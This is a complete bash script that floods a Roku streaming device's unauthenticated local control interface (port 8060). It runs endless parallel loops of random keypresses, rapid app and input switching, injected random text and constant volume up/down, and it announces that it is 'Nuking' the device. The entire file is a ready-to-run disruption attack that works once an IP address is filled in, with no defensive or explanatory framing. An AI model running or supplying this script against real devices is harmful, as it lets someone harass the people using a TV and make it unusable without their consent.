#!/bin/bash

ROKU_IP="your-ip"

# All valid remote keys
KEYS=(Home Up Down Left Right Select Back VolumeUp VolumeDown Mute Info Play Pause Fwd Rev)

# Some apps (add more if you want)
APPS=(12 13 837 2285 41468 291097 31440 tvinput.hdmi1 tvinput.hdmi2 tvinput.hdmi3 tvinput.dtv)

function press_key() {
  KEY=$1
  curl -s -d '' http://$ROKU_IP:8060/keypress/$KEY >/dev/null
}

function launch_app() {
  ID=$1
  curl -s -d '' http://$ROKU_IP:8060/launch/$ID >/dev/null
}

function type_text() {
  for ((i=0; i<5; i++)); do
    RAND=$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)
    curl -s -d "$RAND" http://$ROKU_IP:8060/input
    sleep 0.1
  done
}

function key_spam() {
  while true; do
    KEY=${KEYS[$RANDOM % ${#KEYS[@]}]}
    press_key $KEY
    sleep 0.05
  done
}

function app_spam() {
  while true; do
    APP=${APPS[$RANDOM % ${#APPS[@]}]}
    launch_app $APP
    sleep 0.3
  done
}

function type_spam() {
  while true; do
    type_text
    sleep 0.2
  done
}

echo "[*] Nuking Roku at $ROKU_IP..."

# Launch 3 background hell loops
key_spam &
app_spam &
type_spam &

# Keep volume jittering in foreground
while true; do
  press_key VolumeUp
  sleep 0.1
  press_key VolumeDown
  sleep 0.1
done
